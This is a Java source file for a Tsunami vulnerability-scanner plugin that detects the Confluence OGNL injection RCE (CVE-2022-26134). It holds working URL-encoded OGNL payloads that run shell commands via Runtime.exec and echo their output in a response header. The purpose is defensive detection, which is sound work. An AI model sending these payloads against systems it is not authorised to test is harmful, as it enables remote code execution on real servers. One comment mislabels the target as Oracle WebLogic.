/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202226134;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.ImmutableSet;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects highly critical RCE vulnerability in Oracle WebLogic Admin
 * Console.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ConfluenceOgnlInjectionRceDetector",
    version = "0.1",
    description = "Detects CVE-2022-26134 RCE vulnerability.",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = ConfluenceOgnlInjectionRceDetectorBootstrapModule.class)
public final class ConfluenceOgnlInjectionRceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final ImmutableSet<String> HTTP_EQUIVALENT_SERVICE_NAMES =
      ImmutableSet.of(
          "",
          "unknown", // nmap could not determine the service name, we try to exploit anyway.
          "opsmessaging"); // nmap returns opsmessaging service name for port 8090.
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "Google";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE_2022_26134";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE = "Atlassian Confluence RCE CVE-2022-26134";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "An unauthenticated and remote OGNL injection vulnerability results in remote code execution"
          + " in the Atlassian Confluence. Please read the remediation guidance section below for"
          + " how to mitigate.";

  @VisibleForTesting
  static final String RECOMMENDATION =
      "This is a critical vulnerability requiring immediate action. If your service is vulnerable,"
          + " you should update it to patch the vulnerability. **Please check"
          + " https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
          + " for detailed patch information.**";

  @VisibleForTesting static final String RCE_HEADER = "x-cmd-response";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  ConfluenceOgnlInjectionRceDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = utcClock;
    // Http response for non-callback payload has 302 redirect status code,
    // following the redirect loses the custom cookie.
    this.httpClient = httpClient.modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting rce detection for Atlassian Confluence.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isInScopeService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isInScopeService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        || HTTP_EQUIVALENT_SERVICE_NAMES.contains(networkService.getServiceName());
  }

  private String buildRootUri(NetworkService networkService) {
    if (NetworkServiceUtils.isWebService(networkService)) {
      return NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    }
    return String.format("http://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUri = buildRootUri(networkService);

    return (payloadGenerator.isCallbackServerEnabled()
            && isVulnerableWithCallback(rootUri, networkService))
        || isVulnerableWithoutCallback(rootUri, networkService);
  }

  private boolean isVulnerableWithCallback(String rootUri, NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);
    String rceCommand =
        String.format(
            "%%24%%7B%%40java.lang.Runtime%%40getRuntime%%28%%29.exec%%28%%22%s%%22%%29%%7D/",
            payload.getPayload().replace(" ", "%20"));
    String targetUri = rootUri + rceCommand;

    try {
      sendPayload(targetUri, networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
    return payload.checkIfExecuted();
  }

  private boolean isVulnerableWithoutCallback(String rootUri, NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generateNoCallback(config);
    String targetUri =
        rootUri
            + String.format(
                "%%24%%7B%%28%%23a%%3D%%40org.apache.commons.io.IOUtils%%40toString%%28%%40java.lang.Runtime%%40getRuntime%%28%%29.exec%%28%%22%s%%22%%29.getInputStream%%28%%29%%2C%%22utf-8%%22%%29%%29.%%28%%40com.opensymphony.webwork.ServletActionContext%%40getResponse%%28%%29.setHeader%%28%%22%s%%22%%2C%%23a%%29%%29%%7D/",
                // Encode the payload. Note that the '(' and ')' in the payload should not be
                // encoded, and %s in printf template needs to be encoded.
                payload.getPayload().replace(" ", "%20").replace("%s", "%25s"), RCE_HEADER);
    try {
      HttpResponse response = sendPayload(targetUri, networkService);
      String rceResponse = response.headers().get(RCE_HEADER).orElse("");
      logger.atInfo().log("Injected header: '%s'", rceResponse);
      return response.status().isRedirect() && payload.checkIfExecuted(rceResponse);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private HttpResponse sendPayload(String targetUri, NetworkService networkService)
      throws IOException {
    logger.atInfo().log("Trying to execute confluence payload on target '%s'", targetUri);
    // This is a blocking call.
    return httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build(), networkService);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService networkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(networkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULN_DESCRIPTION)
                .setRecommendation(RECOMMENDATION))
        .build();
  }
}
